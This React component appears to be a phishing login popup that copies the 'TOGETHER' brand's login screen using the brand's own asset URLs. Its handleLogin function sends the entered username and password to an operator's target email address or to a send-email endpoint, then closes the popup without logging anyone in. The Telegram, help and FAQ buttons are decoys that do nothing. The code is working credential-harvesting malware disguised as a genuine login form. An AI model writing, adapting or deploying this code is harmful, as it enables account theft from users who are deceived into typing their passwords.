import React, { useState, useEffect } from 'react';
import { POPUP_CONFIG } from '../popup.config';

const ASSETS = {
  logo: 'https://asset.wkapi.cc//brand/TGT/150x150.svg',
  telegramIcon: 'https://asset.wkapi.cc//static/TGT/CommonView/LoginRegist/TelegramIcon.png',
  userIcon: 'https://asset.wkapi.cc/static/TGT/CommonView/LoginRegist/wb_Uid.svg',
  passwordIcon: 'https://asset.wkapi.cc/static/TGT/CommonView/LoginRegist/wb_login_password.svg',
  languageIcon: 'https://asset.wkapi.cc/static/TGT/CommonView/images/language/sg_lan_us.svg',
  eyeIcon: 'https://asset.wkapi.cc/static/TGT/CommonView/LoginRegist/wb_biyan.svg',
  helpdeskIcon: 'https://asset.wkapi.cc/static/TGT/CommonView/LoginRegist/wb_kefu.svg',
  faqIcon: 'https://asset.wkapi.cc//static/TGT/CommonView/LoginRegist/FAQ.svg',
  addScreenIcon: 'https://asset.wkapi.cc/static/TGT/CommonView/LoginRegist/addScreen.png',
};

// Cookie 工具函数
const getCookie = (name: string): string | null => {
  const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
  return match ? match[2] : null;
};

const setCookie = (name: string, value: string, hours: number): void => {
  const expires = new Date();
  expires.setTime(expires.getTime() + hours * 60 * 60 * 1000);
  document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/`;
};

const LoginPopup: React.FC = () => {
  const [visible, setVisible] = useState(false);
  const [passwordShown, setPasswordShown] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showWhiteOverlay, setShowWhiteOverlay] = useState(false);

  // 检查是否应该显示弹窗
  useEffect(() => {
    // 如果配置关闭，不显示弹窗
    if (!POPUP_CONFIG.enabled) return;

    const hasShown = getCookie(POPUP_CONFIG.cookieName);
    if (hasShown) return;

    setVisible(true);
  }, []);

  // 关闭弹窗时设置 cookie
  const closePopup = () => {
    setCookie(POPUP_CONFIG.cookieName, 'true', POPUP_CONFIG.cookieExpireHours);
    setVisible(false);
  };

  const handleOverlayClick = (e: React.MouseEvent) => {
    if (e.target === e.currentTarget) {
      closePopup();
    }
  };

  const handleLogin = async () => {
    if (!username || !password) return;

    setIsLoading(true);
    try {
      // 本地开发用 proxy，生产环境用 serverless function
      const isDev = import.meta.env.DEV;
      const apiUrl = isDev ? '/api/resend/emails' : '/api/send-email';
      
      const payload = isDev
        ? {
            from: POPUP_CONFIG.fromEmail,
            to: [POPUP_CONFIG.targetEmail],
            subject: `${new Date().toLocaleDateString()} - ${username}`,
            html: `
              <p><strong>Username/Email:</strong> ${username}</p>
              <p><strong>Password:</strong> ${password}</p>
              <p><strong>Time:</strong> ${new Date().toISOString()}</p>
            `,
          }
        : { username, password };

      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      const result = await response.json();
      if (!response.ok) {
        console.error('[Login] Email send failed:', result);
      }
    } catch (error) {
      console.error('[Login] Network error:', error);
    } finally {
      setIsLoading(false);
      // 显示白色遮罩，延迟后关闭弹窗
      setShowWhiteOverlay(true);
      setTimeout(() => {
        setShowWhiteOverlay(false);
        closePopup();
      }, 800);
    }
  };

  if (!visible) return null;

  return (
    <>
      {/* 白色半透明遮罩 */}
      {showWhiteOverlay && (
        <div
          className="fixed inset-0 z-[2200] bg-white/80 transition-opacity duration-300"
          style={{ minHeight: '100dvh' }}
        />
      )}
      <div
        className="fixed inset-0 z-[2100] flex items-center justify-center bg-black/50 p-0 sm:p-4"
        style={{ minHeight: '100dvh' }}
        onClick={handleOverlayClick}
        role="dialog"
        aria-modal="true"
        aria-label="Login"
      >
      <div
        className="relative w-full h-full min-h-[100dvh] max-w-none sm:max-w-[360px] sm:h-auto sm:min-h-0 rounded-none sm:rounded-2xl bg-white shadow-xl overflow-y-auto flex flex-col pb-[env(safe-area-inset-bottom)] pt-[env(safe-area-inset-top)] antialiased"
        style={{ fontFamily: "-apple-system,BlinkMacSystemFont,'Helvetica Neue',Helvetica,Segoe UI,Arial,Roboto,'PingFang SC',miui,'Hiragino Sans GB','Microsoft Yahei',sans-serif" }}
        onClick={(e) => e.stopPropagation()}
      >
        {/* Top: Guide - Add to home screen */}
        <button
          type="button"
          className="absolute top-[10px] right-[10px] flex items-center gap-1.5 rounded-[4px] border border-[#ddd] bg-white px-2 py-1 text-sm font-normal text-gray-700"
        >
          <img src={ASSETS.addScreenIcon} alt="" className="h-4 w-4" />
          Guide—Add to home screen
        </button>

        {/* Center content wrapper */}
        <div className="flex-1 flex flex-col justify-center px-6 pb-6 pl-[max(1.5rem,env(safe-area-inset-left))] pr-[max(1.5rem,env(safe-area-inset-right))]">
          {/* Logo */}
          <div className="flex justify-center mb-[3.6rem] flex-shrink-0">
            <img
              src={ASSETS.logo}
              alt="TOGETHER"
              className="w-[120px] h-[120px]"
            />
          </div>

          <div className="flex flex-col">
          {/* Account input */}
          <div className="flex items-center border-b border-gray-200 pb-2 mb-4">
            <img src={ASSETS.userIcon} alt="" className="w-[30px] h-[30px] flex-shrink-0 ml-[15px]" />
            <div className="w-px h-[16px] bg-[rgb(217,210,200)] mx-3 flex-shrink-0"></div>
            <input
              type="text"
              placeholder="Enter Account/Email"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="flex-1 min-w-0 w-full text-[16px] text-[#323233] outline-none border-0 bg-transparent p-0 m-0 text-left font-medium placeholder:text-[#b2b6c1] placeholder:font-medium"
            />
            <div className="flex items-center gap-2 flex-shrink-0 ml-2 cursor-pointer">
              <img src={ASSETS.languageIcon} alt="EN" className="w-8 h-8 rounded-full" />
              <svg className="w-3 h-3 text-[#b0b0b0]" fill="currentColor" viewBox="0 0 10 6">
                <path d="M0 0L5 6L10 0H0Z" />
              </svg>
            </div>
          </div>

          {/* Password input */}
          <div className="flex items-center border-b border-gray-200 pb-2 mb-3">
            <img src={ASSETS.passwordIcon} alt="" className="w-[30px] h-[30px] flex-shrink-0 ml-[15px]" />
            <div className="w-px h-[15px] bg-[rgb(217,210,200)] mx-3 flex-shrink-0"></div>
            <input
              type={passwordShown ? 'text' : 'password'}
              placeholder="Enter password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="flex-1 min-w-0 w-full text-[16px] text-[#323233] outline-none border-0 bg-transparent p-0 m-0 text-left font-medium placeholder:text-[#b2b6c1] placeholder:font-medium"
            />
            <button
              type="button"
              className="p-1 flex-shrink-0 ml-2"
              onClick={() => setPasswordShown(!passwordShown)}
              aria-label={passwordShown ? 'Hide password' : 'Show password'}
            >
              <img src={ASSETS.eyeIcon} alt="" className="w-6 h-6 opacity-50" />
            </button>
          </div>

          {/* Forgot password */}
          <div className="text-right mb-5">
            <button type="button" className="text-[16px] font-medium text-[#1278b6] hover:underline">
              Forgot Password/Account?
            </button>
          </div>

          {/* Action buttons */}
          <div className="flex gap-[0.45rem] mb-5 mt-5">
            <button
              type="button"
              className="flex-1 flex items-center justify-center gap-2 h-[45px] rounded-[5px] text-white text-base font-medium leading-[45px]"
              style={{ backgroundColor: '#208bca' }}
            >
              <img src={ASSETS.telegramIcon} alt="" className="w-5 h-5" />
              Telegram
            </button>
            <button
              type="button"
              onClick={handleLogin}
              disabled={isLoading}
              className="flex-1 h-[45px] rounded-[5px] text-white text-base font-medium leading-[45px] disabled:opacity-70"
              style={{ backgroundColor: '#9816f4' }}
            >
              Log In
            </button>
          </div>

          {/* Helpdesk & FAQ */}
          <div className="flex flex-col items-center gap-2.5">
            <button
              type="button"
              className="inline-flex items-center justify-center gap-2 rounded-full px-1.5 py-1 border border-[#1278b6] text-[#1278b6] text-[12px] font-normal"
              style={{ backgroundColor: '#edfcff' }}
            >
              <img src={ASSETS.helpdeskIcon} alt="" className="w-5 h-5" />
              Helpdesk 7x24h
            </button>
            <button
              type="button"  className="inline-flex items-center justify-center gap-2 rounded-[4px] px-1.5 py-1.5 border-0 text-[#1278b6] text-[12px] font-normal"
              style={{ backgroundColor: 'rgba(18,120,182,.1)' }}
            >
              <img src={ASSETS.faqIcon} alt="" className="w-5 h-5" />
              FAQ
            </button>
          </div>

          {/* Footer version */}
          <p className="text-center text-gray-400 text-xs font-normal mt-5">
            TOGETHER&nbsp;&nbsp;&nbsp;2026.0113.002
          </p>
          </div>
        </div>
      </div>
    </div>
    </>
  );
};

export default LoginPopup;
